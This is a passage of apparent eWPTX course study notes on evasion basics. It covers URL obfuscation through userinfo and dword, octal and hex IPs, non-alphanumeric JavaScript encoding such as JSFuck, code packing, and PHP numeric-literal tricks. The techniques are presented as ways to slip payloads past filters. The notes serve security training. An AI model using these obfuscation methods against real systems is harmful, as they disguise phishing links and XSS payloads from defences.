+</code></pre><h2 id="53efc479-7819-4603-b2a4-fe339bc1af5a" class=""><strong>URL Hostname Obfuscation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#url-hostname-obfuscation"></a></strong></h2><ul id="7c322fd0-5771-43db-acf3-66ed37f91d24" class="bulleted-list"><li style="list-style-type:disc">normally URLs are used in formats like:<p id="9a2aa719-c093-486c-866c-43511b60c911" class="">→ https://hack.me/test</p></li></ul><ul id="c53d0acc-c50d-462c-a17e-fdf2ad54c748" class="bulleted-list"><li style="list-style-type:disc">but RFC</li></ul><ul id="b02e0c32-d7c0-4ab3-bdb3-b8d5fe5cbdea" class="bulleted-list"><li style="list-style-type:disc">RFC 3986 tells us that the these are also valid URLs:</li></ul><ul id="06f2cc2d-756e-4d09-80f2-61183b4aa102" class="bulleted-list"><li style="list-style-type:disc">https://hack.me:443</li></ul><ul id="ef216e7c-928b-4388-8120-cb730be4c69d" class="bulleted-list"><li style="list-style-type:disc">https://<em>[this_is_valid]</em>@hack.me</li></ul><p id="11b1be54-5dd2-4482-b531-3a1e0d937a87" class="">We want to obfuscate the Authority component of a URI: foo://example.com:8042/over/there?name=ferret#nose</p><table id="b5605df3-39f9-4b8c-b530-d1ae58a3cd2f" class="simple-table"><tbody><tr id="0a495c69-661c-4934-87e0-00e18d1edc0e"><td id="qr_&lt;" class="">scheme</td><td id="f:kH" class="">authority</td><td id="qF\=" class="">path</td><td id="MPXM" class="">query</td><td id="_qA?" class="">fragment</td></tr></tbody></table><p id="a64c3cdd-d9e5-48b6-baf2-5734e34014a8" class="">The Authority component is structured as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="703f48b2-ff3a-45c3-90f5-2fd89d8fe300" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[ userinfo &quot;@&quot; ] host [ &quot;:&quot; port ]
+
+# other than the port subcomponent, we can play with the userinfo and host.
+</code></pre><h3 id="8b1b05c1-cf53-45ce-b5fb-dfcf92f4bed8" class=""><strong>Obfuscating with Userinfo</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#obfuscating-with-userinfo"></a></strong></h3><p id="91008cb1-2e87-4fd2-8ca6-5dfb1127d8ff" class="">The userinfo subcomponent is used For authentication. If credentials are required to access a resource, they can be included here, and the login will be automatic:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="330614b0-c5d9-4a94-8e86-68d0b9fb0241" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://&#x27;username:password&#x27;@www.I-want-login.com/protected_path
+
+# if the page requires NO authentication, the subcomponent text is ignored by both browser and server.
+</code></pre><p id="6ad2c79e-2586-4d18-85d5-dc79442f0a63" class="">Example:</p><ul id="6d060634-9a73-42d9-a76f-cd392408162b" class="bulleted-list"><li style="list-style-type:disc">https://www.google.com@hack.me/t/xss</li></ul><blockquote id="b923c100-b841-418b-9577-fde7344c7db0" class="">hack.me does not implement this kind of authentication and will ignore the www.google.com part (userinfo)</blockquote><p id="0546c465-959b-4bdb-bf6d-542d16080de7" class="">In the userinfo subcomponent, Unicode is allowed, therefore, it does not need other additional clarifications if we want add signals or letter of other languages.</p><blockquote id="06a0eb08-01b4-4b2e-a2c3-faab88c77615" class="">not all browser support this obfuscation technique. Firefox and Opera show alert messages.</blockquote><figure id="928441a0-f463-4530-94e0-a93b8a56ac33" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/46.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/46.png"/></a></figure><figure id="0e29d4a3-b241-457b-b3f4-8b6456167de1" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/45.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/45.png"/></a></figure><h3 id="75dcdcd9-5cb4-4fbf-9ae2-242934c1eb67" class=""><strong>Obfuscating with Host</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#obfuscating-with-host"></a></strong></h3><p id="00c68ee7-b6a0-4c11-8ae0-a92c71bf77f6" class="">Internet names are translated to IP addresses. But there are other ways to represent the same <strong>number</strong>, such as: <em>Dword</em>, <em>Octal</em>, <em>Hexadecimal</em>.</p><figure id="0107acbf-d111-446e-b8f1-1da08c81a2cc" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/47.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/47.png"/></a></figure><h3 id="4b0afc8d-cba8-4a82-ac46-d6cf4c129054" class=""><strong>Dword - google.com</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#dword---googlecom"></a></strong></h3><p id="a9f60db6-48e8-4c65-a577-5d33fc5171a0" class="">Double Word is known as Integer IP. IP is translated to an equivalent 16bit number.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dea8c45b-e265-40e6-8a46-47e9e94ff774" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">google.com &gt; 216.58.218.78 &gt; http://3627734862
+</code></pre><h3 id="08e463b7-192d-41b4-beb2-bdc2afe0e1e3" class=""><strong>Octal - google.com</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#octal---googlecom"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a58e747f-6ade-4b05-9564-51df016e7a02" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">google.com &gt; 216.58.218.78 &gt; http://0330.0072.0327.0116
+</code></pre><blockquote id="be86cf97-8eea-4796-88b7-1063d6688545" class="">we can also feed each number by adding leading zeroes without break the original value</blockquote><h3 id="ce123e48-56e3-4b6c-b229-c4f3b207647f" class=""><strong>Hexadecimal - google.com</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#hexadecimal---googlecom"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f5376f4e-96a9-402d-9f7f-ffb7ace928e8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://0xd83ada4e or http://0xd8.0x3a.0xda.0x4e
+</code></pre><blockquote id="2e614d83-a80f-4ab7-91e7-de45db1409ed" class="">its also possible to add zeroes like 0x000000d8 …</blockquote><h3 id="67b41147-afda-4b8b-926e-e0569a280bfa" class=""><strong>Hybrid</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#hybrid"></a></strong></h3><ul id="83e22dd9-dc04-4bc1-8d07-5a83c1c93a1f" class="bulleted-list"><li style="list-style-type:disc">these are the basic techniques, however, its also possible to mix these and create a hybrid</li></ul><ul id="1cdbbc03-e14e-4224-af19-f040246cdd02" class="bulleted-list"><li style="list-style-type:disc">this tool apply all the techniques discussed</li></ul><p id="9f55cffa-554b-4bea-a57e-4e1687952015" class="">→ http://www.silisoftware.com/tools/ipconverter.php</p><h2 id="261de86c-8d2b-4553-bb20-1850603cb62c" class=""><strong>Java Obfuscation Techniques</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#java-obfuscation-techniques"></a></strong></h2><h3 id="0d5a5628-94f5-4c1c-8a50-c28670ba2ed7" class=""><strong>Non-Alphanumeric</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#non-alphanumeric"></a></strong></h3><p id="86200226-827a-418e-ba01-4a1b5a5adf6f" class="">Its way to encode Javascript code by using only non-alphanumeric characters.</p><h3 id="ffd085ae-4ae2-4495-9bc6-e164e654d41f" class=""><strong>String Casting</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#string-casting"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="162add1b-ddf2-4481-935f-c3715f7057ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&quot;&quot; + 1234 or 1234 + &quot;&quot; # returns &quot;1234&quot;
+[] + 1234 or 1234 + [] # returns &quot;1234&quot;
+x = &quot;hello&quot;
+[1,&quot;a&quot;,x] # returns [1, &quot;a&quot;, &quot;hello&quot;]
+[1,&quot;a&quot;,x]+&quot;&quot;  # returns &quot;1, a, hello&quot;
+</code></pre><h3 id="ffcc6000-a504-4ca3-a2ce-68b3562232a3" class=""><strong>Booleans</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#booleans"></a></strong></h3><p id="18eca030-446e-405c-8774-d204922f6ae8" class="">There are many ways to return a Boolean value using non-alphanumeric characters:</p><table id="226cac59-5f6e-485b-9ee2-bd9d24560031" class="simple-table"><tbody><tr id="c9eff348-9aac-4000-acc6-27151db459a8"><td id="K&lt;Ad" class="">False</td><td id="]^M]" class="">True</td></tr><tr id="6e4eae95-076c-45da-be6e-4cf4a7d39060"><td id="K&lt;Ad" class="">![ ]</td><td id="]^M]" class="">!![ ]</td></tr><tr id="f64705a4-e24e-4088-bf79-e0bdb7597f49"><td id="K&lt;Ad" class="">!{ }</td><td id="]^M]" class="">!!{ }</td></tr><tr id="8cc050a6-3cc8-4c87-b76f-d0203e59bc87"><td id="K&lt;Ad" class="">!!” “</td><td id="]^M]" class="">!” “</td></tr><tr id="b66ff01e-d362-431a-9aa1-fdde8eec3350"><td id="K&lt;Ad" class="">[ ]=={ }</td><td id="]^M]" class="">[ ]==””</td></tr></tbody></table><p id="1dba3539-ea87-44bc-98e2-03fe7bf0fce1" class="">To extract the true or false string:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0a9635c5-357f-42fa-802d-e8b10e1ab69f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">[!![ ]]+&quot;&quot; # returns &#x27;true&#x27;
+[![ ]]+&quot;&quot;  # returns &#x27;false&#x27;
+</code></pre><h3 id="16cf50d5-f2af-4542-8c77-0ee5d3688d91" class=""><strong>Numbers</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#numbers"></a></strong></h3><ul id="5f63c296-e1d6-4a94-941a-8c632b2f991f" class="bulleted-list"><li style="list-style-type:disc">Can be created. true is 1 and false is 0;</li></ul><ul id="77699a9e-c08a-4648-9f13-06512c9a9e75" class="bulleted-list"><li style="list-style-type:disc">to generate 1 we can do true+false and 2 true+true… etc</li></ul><p id="151e6b4d-1ab4-42f8-b426-76ba8c263a5c" class="">Examples: number zero <strong>0</strong>:</p><table id="061c7c63-56bb-4a70-bfde-908046aee689" class="simple-table"><tbody><tr id="2a429ce1-fe96-4459-a907-69db18ab14b8"><td id="m]BU" class="">+””</td><td id="jFoo" class="">+[ ]</td><td id="gSE^" class="">![ ]+![ ]</td></tr><tr id="b8704c98-7ca8-4aeb-a328-2f5cd940a923"><td id="m]BU" class="">-“”</td><td id="jFoo" class="">-[ ]</td><td id="gSE^" class="">![ ]+!{ }</td></tr><tr id="efdee614-89d7-4519-b2fc-a851d4d0d2e9"><td id="m]BU" class="">-+-+””</td><td id="jFoo" class="">-+-+[ ]</td><td id="gSE^" class="">![ ]+!!””</td></tr></tbody></table><figure id="924365c4-5df8-4725-8e3c-7e1cec619b34" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/48.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/48.png"/></a></figure><h3 id="b4d09517-2cd5-48f8-b276-0799a1f7fa9b" class=""><strong>String</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#string"></a></strong></h3><p id="96c00bdc-0deb-431e-90dd-987721f40629" class="">How to generate custom strings. For example if we wanna generate the <strong>alert</strong> string, we need to generate each character separately and then put them together.</p><ul id="807953b3-207a-4222-97d4-12a0ebdb282e" class="bulleted-list"><li style="list-style-type:disc">Generate <strong>alert</strong> string</li></ul><p id="f01e8b73-c7d9-4ec2-9554-68d22d9efac7" class="">We need to use the string output of native JavaScript objects and extract the characters required. Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="39607f80-bdc3-480e-8562-f16e1bd4ae8b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">_={}+[] # is &quot;[object Object]&quot;
+[]/[]+&quot;&quot; # is &quot;NaN&quot;
+!![]/![]+&quot;&quot; # is &quot;Infinity&quot;
+</code></pre><p id="31f38b7d-9376-433b-9108-59241cb2ec93" class="">So to extract the alpha char <strong>a</strong> we use the Nan String and acces the position 1:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fa2d4c50-f0f9-4850-b49c-c216462d2158" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">([]/[]+&quot;&quot;)[![]+!![]] #&quot;a&quot; cause string can be accessed like arrays
+(&quot;NaN&quot;)[1]
+</code></pre><p id="134215dd-fdbb-482e-8d49-b38afd784768" class="">The remaining alpha characters can be generated using the following messages:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c75b3c49-afd8-4a17-a240-f3aa5c9e928a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">a - &quot;Nan&quot;, fAlse
+l - faLse
+e - truE. falsE or [objEct ObjEct]
+r - tRue
+t - True or infiniTy
+</code></pre><h3 id="e3a7c45b-a483-401d-8718-ac78a6cf7137" class=""><strong>Encoding</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#encoding"></a></strong></h3><p id="a881fa5c-605e-44ec-a472-d904aca4aec1" class="">Based on this technique:</p><ul id="fc543d32-0bc5-4ab3-a31b-f518b7923847" class="bulleted-list"><li style="list-style-type:disc">JJencode = http://utf-8.jp/public/jjencode.html</li></ul><ul id="e0db7683-bbe0-4e91-8003-7f33707adc69" class="bulleted-list"><li style="list-style-type:disc">Aaencode = http://utf-8.jp/public/aaencode.html</li></ul><ul id="0c50d4e6-3a17-44a2-81ea-189e929221ed" class="bulleted-list"><li style="list-style-type:disc">JSFuck = http://www.jsfuck.com/</li></ul><p id="7b59866b-e0b5-4496-bf81-0840020dcd56" class="">→ https://github.com/aemkei/jsfuck/blob/master/jsfuck.js</p><figure id="092fce8b-f135-4e01-af86-151aaa0281c5" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/49.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/49.png"/></a></figure><h3 id="5c654987-099f-43d6-8deb-52b57fadf97c" class=""><strong>JavaScript Compressing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#javascript-compressing"></a></strong></h3><p id="947e7299-23c5-4f9f-8b7b-0e2ed28451f8" class="">To make JavaScript run faster, developers often use tools that compile JavaScript into more compact and higher performing code. By using these tools, its also possible to obfuscate code and evade detection. This is what we are going to be looking For in this chapter.</p><h3 id="2ae83197-ea3b-4453-8c02-46e60ca0adad" class=""><strong>Minifying</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#minifying"></a></strong></h3><p id="0ede8038-d290-49a9-9227-cd859dc152f5" class="">The process of minifying JavaScript code is by removing all unnecessary characters without changing the functionality of the original code. Basically, all characters that are used to add readability to the code is removed. These characters are ignored by the interpreter. Examples of these are: whitespaces, new line, comments. Some tools:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="807ca455-ea85-41da-9b7a-080012b1ef51" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Closure compiler - https://developers.google.com/closure/compiler/
+YUICompressor    - http://yui.github.io/yuicompressor/
+JSMin            - http://crockford.com/javascript/jsmin
+Packer           - http://dean.edwards.name/packer/
+</code></pre><h3 id="fc0280b2-3bd9-4db1-8841-d6dc86213135" class=""><strong>Packing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#packing"></a></strong></h3><p id="6d3594e7-26ad-482a-bcd6-e9578278be00" class="">A packer compresses the minified code by shortening variable names, functions and other operations. In other words, it makes the code unreadable.</p><h2 id="b33ce2d7-e521-456e-81bb-94445f17c25c" class=""><strong>PHP Obfuncations Techniques</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#php-obfuncations-techniques"></a></strong></h2><p id="0e4b06ae-9203-453b-8472-9c9d2c27d635" class=""><strong>They ways of PHP obfuscation are infinite…</strong></p><ul id="333cd753-96bf-4e02-b9bc-99da1aa9416d" class="bulleted-list"><li style="list-style-type:disc">Basic Language Reference</li></ul><h3 id="5f39bb60-83e8-46f7-8b46-714e3094e0b0" class=""><strong>Type Juggling</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#type-juggling"></a></strong></h3><p id="1de1872a-6e4b-41a4-bec0-f329a24215de" class="">PHP is a dynamically typed language. PHP does not require/support explicit type definition in variable declaration Basically, we can declare the same variable and as we assign different values (string, int, etc) the type of the variable changes.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e902d7a8-a970-4322-a277-396556fd7d6d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$joke = &quot;1&quot;
+$joke++;
+$joke = &quot;a string&quot;
+</code></pre><h3 id="cd7ea1f1-9601-45d0-9b8f-66f965d9847e" class=""><strong>Numerical Data Types</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#numerical-data-types"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7f177075-3a39-44a6-bc24-9c274d3af7ae" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$x = &#x27;Giuseppe&#x27;;
+echo $x[0];    # decimal index     (0) &gt; &#x27;G&#x27;
+echo $x[0001]; # octal index       (1) &gt; &#x27;i&#x27;
+echo $x[0x02]; # hexadecimal index (2) &gt; &#x27;u&#x27;
+echo $x[0b11]; # binary index      (3) &gt; &#x27;s&#x27;
+</code></pre><p id="1ab3d52f-e601-4be5-9fa4-e201e46b4509" class="">Access String / Integer Numbers</p><p id="192a3884-eec5-421e-9c52-3c529efb3dd1" class="">How the structure For integer literals are:</p><table id="4502fa02-3305-4872-8c28-9ced2a1dc3b7" class="simple-table"><tbody><tr id="1d2a0137-578c-4048-bb55-79308124afed"><td id="B^L[" class="">Integer</td><td id="RaFf" class=""></td><td id="Ik|C" class=""></td><td id="?VO|" class=""></td></tr><tr id="f0f14a88-9449-4b25-ab73-8251e4414529"><td id="B^L[" class="">decimal</td><td id="RaFf" class="">hexadecimal</td><td id="Ik|C" class="">octal</td><td id="?VO|" class="">binary</td></tr><tr id="00992acb-5899-4e31-b325-7b2e982e5631"><td id="B^L[" class="">[1-9][0-9]* or 0</td><td id="RaFf" class="">0[xX][0-9a-fA-F]+</td><td id="Ik|C" class="">0[0-7]+</td><td id="?VO|" class="">0b[01]+</td></tr></tbody></table><h3 id="bd9fe95e-f653-4c01-ba59-36b51b8a6616" class=""><strong>Access String / Floating Numbers</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#access-string--floating-numbers"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="486e6e40-76f8-4635-b024-09ff1c0728fa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">$x = &#x27;Giuseppe&#x27;;
+echo $x[0.1];             # floating 0.1 casted to 0 (0) &gt; &#x27;G&#x27;
+echo $x[.1e+1];           # exponential       (1) &gt; &#x27;i&#x27;
+echo $x[0.2E+0000000001]; # long exponential  (2) &gt; &#x27;u&#x27;
+echo $x[1e+1-1E-1-5.999]; # exponential and floating expression 3.901 casted to 3 &gt; &#x27;s&#x27;
+</code></pre><p id="9ce99fe4-12dc-4f73-a51d-42b0a3d0af58" class="">How the structure For floating literals are:</p><table id="2b0bbf87-87ec-4c47-8491-86b244709139" class="simple-table"><tbody><tr id="5a5be738-e179-401c-a63f-64ebfa846191"><td id="rRs}" class="">Floating</td><td id=";\O{" class=""></td><td id="Dieb" class=""></td><td id="zsyj" class=""></td><td id="rsZL" class=""></td></tr><tr id="71c04466-6f97-49b7-860b-d9efae3b174f"><td id="rRs}" class="">LNUM</td><td id=";\O{" class="">DNUM</td><td id="Dieb" class="">EXPONENT_DNUM</td><td id="zsyj" class=""></td><td id="rsZL" class=""></td></tr><tr id="1351d589-1922-4184-898e-3ab15005d507"><td id="rRs}" class="">[0-9]+</td><td id=";\O{" class="">([0-9]*[.]{LNUM})</td><td id="Dieb" class="">({LNUM}[.][0-9]*)</td><td id="zsyj" class="">[+-]?(({DNUM}</td><td id="rsZL" class="">{DNUM}) [eE][+-]? {LNUM})</td></tr></tbody></table><h3 id="b8b30fe6-0678-42da-af6c-274118ca9a28" class=""><strong>Exotic Number Generation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/evasionbasics/#exotic-number-generation"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 